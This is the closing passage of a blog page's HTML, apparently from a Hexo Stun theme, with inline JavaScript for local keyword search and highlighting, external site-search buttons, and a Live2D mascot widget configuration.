                while((index = text.indexOf(word, startIndex)) !== -1) {
                  var hasMatch = false;
                  // 索引位置相同的关键词，保留长度较长的
                  titleHitSlice.forEach(function (hit) {
                    if (hit.index === index && hit.word.length < word.length) {
                      hit.word = word;
                      hasMatch = true;
                    }
                  });
                  startIndex = index + word.length;
                  !hasMatch && result.push({ index: index, word: word, weight: weight });
                }
                return result;
              }
              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
            });

            var hitTitle = titleHitSlice.length;
            var hitContent = contentHitSlice.length;

            if (hitTitle > 0 || hitContent > 0) {
              isMatch = true;
            }
            if (isMatch) {
              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
                // 按照匹配文字的索引的递增顺序排序
                hit.sort(function (left, right) {
                  return left.index - right.index;
                });
              });
              /**
              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
              * @param {String} text 原文本
              * @param {Array} hitSlice 匹配项的索引信息
              * @param {Number} start 开始索引
              * @param {Number} end 结束索引
              * @return {String}
              */
              function highlightKeyword (text, hitSlice, start, end) {
                if (!text || !hitSlice || !hitSlice.length) {
                  return;
                }

                var result = '';
                var startIndex = start;
                var endIndex = end;
                hitSlice.forEach(function (hit) {
                  if (hit.index < startIndex) {
                    return;
                  }

                  var hitWordEnd = hit.index + hit.word.length;
                  result += text.slice(startIndex, hit.index);
                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
                  startIndex = hitWordEnd;
                });
                result += text.slice(startIndex, endIndex);
                return result;
              }

              var postData = {};
              // 文章总的搜索权重
              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
              // 标记匹配关键词后的标题
              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
              // 标记匹配关键词后的内容
              var postContent;
              // 显示内容的长度
              var SHOW_WORD_LENGTH = 200;
              // 命中关键词前的字符显示长度
              var SHOW_WORD_FRONT_LENGTH = 20;
              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;

              // 截取匹配的第一个字符，前后共 200 个字符来显示
              if (contentHitSlice.length > 0) {
                var firstIndex = contentHitSlice[0].index;
                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
                var end = firstIndex + SHOW_WORD_END_LENGTH;
                postContent = highlightKeyword(content, contentHitSlice, start, end);
              } else { // 未匹配到内容，直接截取前 200 个字符来显示
                postContent = content.slice(0, SHOW_WORD_LENGTH);
              }
              postData.title = postTitle;
              postData.content = postContent;
              postData.url = postURL;
              postData.weight = postWeight;
              matchPosts.push(postData);
            }
          });
        }

        var resultInnerHtml = '';
        if (matchPosts.length) {
          // 按权重递增的顺序排序，使权重大的优先显示
          matchPosts.sort(function (left, right) {
            return right.weight - left.weight;
          });
          resultInnerHtml += '<ul>';
          matchPosts.forEach(function (post) {
            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
            resultInnerHtml += post.title;
            resultInnerHtml += '</a><div class="search-results-content">';
            resultInnerHtml += post.content;
            resultInnerHtml += '</div></li>';
          });
          resultInnerHtml += '</ul>';
        } else {
          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
        }
        $result.html(resultInnerHtml);
      };
      $input.on('input', searchPost);
      $input.on('keyup', function (e) {
        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
          searchPost();
        }
      });
    }
  });
}

function closeSearch () {
  $('body').css({ overflow: 'auto' });
  $('.search-popup').css({ display: 'none' });
  $('.search-mask').css({ display: 'none' });
}

window.addEventListener('DOMContentLoaded', function () {
  Stun.utils.pjaxReloadLocalSearch = function () {
    $('.header-nav-search').on('click', function (e) {
      e.stopPropagation();
      $('body').css('overflow', 'hidden');
      $('.search-popup')
        .velocity('stop')
        .velocity('transition.expandIn', {
          duration: 300,
          complete: function () {
            $('.search-popup input').focus();
          }
        });
      $('.search-mask')
        .velocity('stop')
        .velocity('transition.fadeIn', {
          duration: 300
        });

      initSearch();
    });
    $('.search-mask, .search-close').on('click', function () {
      closeSearch();
    });
    $(document).on('keydown', function (e) {
      // Escape <=> 27
      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
        closeSearch();
      }
    });
  };

  Stun.utils.pjaxReloadLocalSearch();
}, false);

function safeOpenUrl(url) {
  var newTab = window.open();
  newTab.opener = null;
  newTab.location = url;
}

function extSearch(engine) {
  var engines = {
    google: 'https://www.google.com/search?q=',
    bing: 'https://cn.bing.com/search?q=',
    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
  };
  var host = window.location.host;
  var query = $('.search-input input').val().toLowerCase().trim();
  var uri = engines[engine] + query + ' site:' + host;

  if (query) {
    safeOpenUrl(uri);
  } else {
    Stun.utils.popAlert('warning', 'Please enter characters');
  }
}

var assistSearchList = window.CONFIG.assistSearch;

if (Array.isArray(assistSearchList)) {
  assistSearchList.forEach(function (name) {
    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
      extSearch(name);
    }, false);
  });
}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/assets/wanko.model.json"},"display":{"superSample":2,"width":150,"height":300,"position":"left","hOffset":0,"vOffset":-80},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body></html>